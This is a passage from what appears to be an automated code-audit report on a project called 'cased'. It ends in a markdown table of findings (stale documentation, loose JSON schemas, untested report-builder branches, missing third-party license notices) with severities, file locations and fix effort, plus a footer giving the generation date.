| [agents-md-stale-after-prelaunch-cleanup](#agents-md-stale-after-prelaunch-cleanup) | moderate | `AGENTS.md:19,43-47,60` | trivial | related: ci-drift-gates |
| [readme-slide-mode-wrong-key](#readme-slide-mode-wrong-key) | moderate | `README.md:137` | trivial | — |
| [finalize-skips-ledger-commit-verification](#finalize-skips-ledger-commit-verification) | moderate | `src/viewer/build-report.mjs:831-836` | small | related: bare-catch, finalize-branches-untested |
| [crustoleum-run-tools-path-unresolvable-from-cased](#crustoleum-run-tools-path-unresolvable-from-cased) | moderate | `skills/cased/SKILL.md:243-244` | trivial | — |
| [codex-max-threads-undercounts-agents](#codex-max-threads-undercounts-agents) | moderate | `skills/cased/references/codex-tools.md:47-50` | trivial | — |
| [readme-crustoleum-counts-and-agent-table-stale](#readme-crustoleum-counts-and-agent-table-stale) | advisory | `README.md:45-56,181` | trivial | — |
| [readme-primary-install-path-unverified](#readme-primary-install-path-unverified) | advisory | `README.md:69-72` | trivial | — |
| **The API Design Surface** | | | | |
| [contract-fields-absent-from-schema](#contract-fields-absent-from-schema) | moderate | `src/schemas/findings.schema.json:51-55` | small | enabled by: findings-schema-accepts-unknown-keys |
| [findings-schema-accepts-unknown-keys](#findings-schema-accepts-unknown-keys) | moderate | `src/schemas/findings.schema.json:12-17` | medium | enables: contract-fields-absent |
| [summary-counts-never-cross-checked](#summary-counts-never-cross-checked) | moderate | `src/viewer/build-report.mjs:348-353` | small | related: findings-schema-accepts-unknown-keys |
| [ledger-addresses-silently-parses-nothing](#ledger-addresses-silently-parses-nothing) | moderate | `src/viewer/prior-audits.mjs:30` | trivial | related: disposition-vocabulary |
| [build-report-subcommand-fallback](#build-report-subcommand-fallback) | moderate | `src/viewer/build-report.mjs:941-953` | small | related: shipped-help, build-subcommand-unguarded |
| [run-eval-effort-ignored-on-claude](#run-eval-effort-ignored-on-claude) | moderate | `evals/scripts/run-eval:140-144` | trivial | related: entrypoint-guard |
| [shipped-help-names-source-paths](#shipped-help-names-source-paths) | advisory | `src/recon/recon:7-8` | trivial | related: subcommand-fallback |
| [disposition-vocabulary-triplicated](#disposition-vocabulary-triplicated) | advisory | `src/viewer/gates.mjs:73-74` | small | related: ledger-addresses, flat-findings |
| **The Code Quality Surface** | | | | |
| [build-report-cli-monolith](#build-report-cli-monolith) | moderate | `src/viewer/build-report.mjs:940-953` | medium | enables: finalize-gate-branches-untested |
| [agents-readme-render-duplication](#agents-readme-render-duplication) | moderate | `src/viewer/build-report.mjs:696-712` | small | related: cli-monolith, untested-render |
| [untested-render-and-escape-exports](#untested-render-and-escape-exports) | moderate | `src/viewer/build-report.mjs:204-206` +3 | small | related: flow-diagram-tests, prose-links |
| [finalize-gate-branches-untested](#finalize-gate-branches-untested) | moderate | `src/viewer/build-report.mjs:807-819` | small | enabled by: cli-monolith |
| [build-viewer-parallel-copy-lists](#build-viewer-parallel-copy-lists) | advisory | `scripts/build-viewer.sh:18-22` | trivial | — |
| [detect-npm-test-command-discarded](#detect-npm-test-command-discarded) | note | `src/recon/recon-to-yaml.mjs:334-342` | trivial | — |
| [flat-findings-traversal-reimplemented](#flat-findings-traversal-reimplemented) | note | `src/viewer/gates.mjs:14-16` +4 | trivial | related: disposition-vocabulary |
| **The Supply Chain Surface** | | | | |
| [bundled-third-party-source-missing-license-notices](#bundled-third-party-source-missing-license-notices) | significant | `skills/cased/scripts/build-report.js:38-40` | small | — |
| [eval-runner-no-external-cli-preflight-check](#eval-runner-no-external-cli-preflight-check) | moderate | `evals/scripts/run-eval:77-78` | trivial | — |

Blocking (release-gating): 3 · Backlog: 39

---

<sub>
Generated 2026-08-28. Source artifacts: recon.yaml, findings.yaml, report.html (corrupt — see the note under the assessment).
</sub>
